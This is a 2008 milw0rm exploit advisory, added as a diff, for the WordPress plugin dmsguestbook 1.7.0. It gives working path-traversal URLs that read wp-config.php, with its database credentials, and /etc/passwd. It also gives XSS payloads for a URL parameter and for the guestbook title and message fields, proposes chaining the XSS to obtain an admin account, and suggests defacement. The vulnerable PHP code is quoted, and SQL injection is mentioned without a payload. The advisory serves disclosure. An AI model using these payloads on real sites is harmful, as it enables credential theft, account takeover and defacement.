@@ -1,0 +1,71 @@
+########################################################
+Wordpress Plugin dmsguestbook 1.7.0 Multiple Remote Vulnerabilities
+by NBBN  2nd, February 2008
+########################################################
+
+1) File Disclosure
+
+Open the following url you can see the config data of wordpress, with the 
+mysql-server username and password. In this file you usually have write 
+permission, so an attacker can place his deface page here: 
+ 
+http://site.tld/wordpress/wp-admin/admin.php?page=dmsguestbook&advanced=1&folder=language/&file=../../../../wp-config.php
+
+Vuln code:
+Line: 652-655
+$handle = fopen ($abspath . "wp-content/plugins/dmsguestbook/" . 
+$_REQUEST[folder] . $_REQUEST[file], "r");
+	if(is_writable($abspath . "wp-content/plugins/dmsguestbook/" . 
+$_REQUEST[folder] . $_REQUEST[file])) {
+	echo "<br />$_REQUEST[file] <font style='color:#00bb00;'>is 
+writable!</font><br />Set $file readonly again when your finished to 
+customize!";
+
+
+$_REQUEST[folder] & $_REQUEST[file] doesn't checked.
+
+
+
+Another PoC: 
+http://localhost/xampp/wordpress/wp-admin/admin.php?page=dmsguestbook&advanced=1&folder=language/&file=../../../../../../../../../../../../../../../../etc/passwd
+
+Ok, for this you need an admin account, but you can get an admin account with 
+the follow xss vulnerabilities. 
+
+################
+
+
+2) Cross-Site Scripting Vulnerabilities
+
+a) If the script doesn't find the file, php shows an errormessage, so for xss 
+open this:
+
+
+http://site.tldwordpress/wp-admin/admin.php?page=dmsguestbook&advanced=1&folder=language/&file=<script>alert("XSS")</script>
+
+b) Another vulnerability:
+
+Find the guestbook page. In the messagefield write </textarea>[your xss code]. 
+So, if admin go to the admin panel, to show himself the guestbook, he execute 
+your xss code
+
+c) Again in the guestbook
+
+Enter your message in the title ">[xss]  and in the messagearea: 
+</textarea>[xss] and enter a wrong captcha-code, you execute the xss code
+
+
+
+
+Note: There more some more XSS-Vuln's. 
+
+
+################
+
+3) SQL-Injection Vulnerabilities
+
+There are some SQL-Injection vulnerabilites, but an attacker need an admin 
+account and if he is in the administration-panel, a sql-injection he not 
+need. 
+
+# milw0rm.com [2008-02-02]
